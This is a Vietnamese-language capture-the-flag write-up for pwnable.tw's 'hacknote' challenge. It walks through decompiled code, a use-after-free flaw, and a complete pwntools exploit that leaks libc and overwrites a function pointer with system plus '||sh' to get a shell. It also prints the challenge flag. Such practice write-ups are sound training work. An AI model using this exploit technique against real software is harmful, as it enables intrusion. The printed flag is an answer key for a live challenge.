# Hack Note

tiếp tục 1 chall trong pwnable.tw

## ida

```c 
int menu()
{
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  return printf("Your choice :");
}

unsigned int add()
{
  int v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( number <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&ptr + i) )
      {
        *(&ptr + i) = malloc(8u);
        if ( !*(&ptr + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)*(&ptr + i) = output;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = (int)*(&ptr + i);
        *(_DWORD *)(v0 + 4) = malloc(size);
        if ( !*((_DWORD *)*(&ptr + i) + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)*(&ptr + i) + 1), size);
        puts("Success !");
        ++number;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}

unsigned int delete()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= number )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
  {
    free(*((void **)*(&ptr + v1) + 1));
    free(*(&ptr + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}

unsigned int show()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= number )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
    (*(void (__cdecl **)(_DWORD))*(&ptr + v1))(*(&ptr + v1));
  return __readgsdword(0x14u) ^ v3;
}

void __cdecl __noreturn main()
{
  int v0; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v0 = atoi(buf);
      if ( v0 != 2 )
        break;
      delete();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        show();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

nhìn tổng quan thì ta đoán được đây là 1 chall liên quan đến heap, cùng phân tích sâu nào

## Analyse

- chương trình cho ta 4 option, 1 là malloc, 2 là free, 3 là show nhưng không có hàm print hay puts nên mình sẽ phân tích sau, 4 là exit
- ta cần phân tích từng option một vì nó khá quan trọng
- ở option 1 thì ta malloc 2 lần, 1 lần tạo chunk1 có size là 0x8 để lưu output là 0x804862b, lần sau thì tạo chunk2 có size và content như ta nhập vào
  
![image](https://github.com/gookoosss/CTF/assets/128712571/24f42fb8-0d46-4e65-bdca-663844b7781e)

- ở option 2 cũng tương tự option 1, có 2 lần free, lần đầu free chunk2 là content, lần sau free chunk1 là 0x804862b

![image](https://github.com/gookoosss/CTF/assets/128712571/42a7ee4b-07fd-4551-83ef-b2503668245b)

- ở option 3 khá lạ, thay vì in bằng print hay puts, thì nó lại call thằng output là 0x804862b để in ra content

![image](https://github.com/gookoosss/CTF/assets/128712571/cf6d8ed8-dac6-4948-9296-183695b187ff)

- ban đầu mình nghĩ ngay đến hướng làm sử dụng UAF và DBF để khai __free_hook thành system và lấy shell, nhưng mà khoan đã, hãy đọc kĩ ida đi, number chỉ giới hạn có lần 5 add, mà để sử dụng double free để leak libc hay tạo shell vì 5 lần add chắc chắn là không bao giờ đủ
- chuyển hướng khai thác khác thg option 3, vì nó có hàm call content cái chunk 1 nên nếu ta có thể lợi dụng lỗi Use After Free để thay đổi content chunk 1 thành system thì ta hoàn toàn lấy được shell

## exploit
### Stage 1: leak libc
- trước tiên ta cần leak libc đã
- để leak libc thì ta cần tạo 1 chunk lớn hơn 0x400 để sau khi free nó sẽ lưu vào unsorted bins (nhớ tạo thêm 1 chunk bất kì để ngăn cách chunk này vs top chunk)
- nma khi ta free bằng option 2 là nó free luôn cái output trong chunk 1 của ta luôn làm ta ko in được libc => sử dụng UAF để khởi tạo lại output cho chunk 1
- tính offset và ta có libc base

```python 
output = 0x804862b

add(0x508, b'a'*0x4) # 0
add(0x18, b'a'*0x4) # 1
delete(b'0')
delete(b'1')
add(0x8, p32(output)) # 2
# dừng ở đây và quan sát ta sẽ thấy output đã được khởi tạo lại cho chunk 1
show(b'0')
libc_leak = u32(p.recv(4))
libc.address = libc_leak - 0x1b07b0
print(hex(libc_leak))
print(hex(libc.address))
```

### Stage 2: get shell

- sau khi có được libc rồi ta free thằng add() 2 đi để sử dụng lại tạo shell
- ban đầu mình tính dùng one_gadget nma ko được rồi :))
- nên h ta phải dùng system thôi , thay vì call thg output thì giờ thành call system
- file 32 bit nên ta ko chèn /bin/sh\0 được, tham khảo wu thì ta chèn ||sh thôi
- gọi show() và lấy shell thôi

![image](https://github.com/gookoosss/CTF/assets/128712571/d103facf-1656-4dac-b615-6e5051769245)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
# p = process([exe.path])
        
# gdb.attach(p, gdbscript = '''
# b*0x08048701
# b*0x0804872C
# b*0x08048789
# b*0x08048863
# b*0x08048879
# b*0x080488E0
# b*0x0804893d
# c
# ''')

# input()

p = remote('chall.pwnable.tw' ,10102)

output = 0x804862b
ptr = 0x0804A050
number = 0x0804A04C 

def add(size, data):
    p.sendafter(b'choice :', b'1')
    p.sendafter(b'size :', str(size))
    p.sendafter(b'Content :', data)

def delete(index):
    p.sendafter(b'choice :', b'2')
    p.sendafter(b'Index :', index)

def show(index):
    p.sendafter(b'choice :', b'3')
    p.sendafter(b'Index :', index)



add(0x508, b'a'*0x4) # 0
add(0x18, b'a'*0x4) # 1
delete(b'0')
delete(b'1')
add(0x8, p32(output)) # 2
show(b'0')
libc_leak = u32(p.recv(4))
libc.address = libc_leak - 0x1b07b0
print(hex(libc_leak))
print(hex(libc.address))

delete(b'2')
one_gadget = libc.address + 0x3a819
# 0x5f065 0x5f066
pop_rdi_rbp = 0x08048b0a 
add(0x8, p32(libc.sym['system']) + b'||sh')
show(b'0')

p.interactive()

# FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
```

## Flag

FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
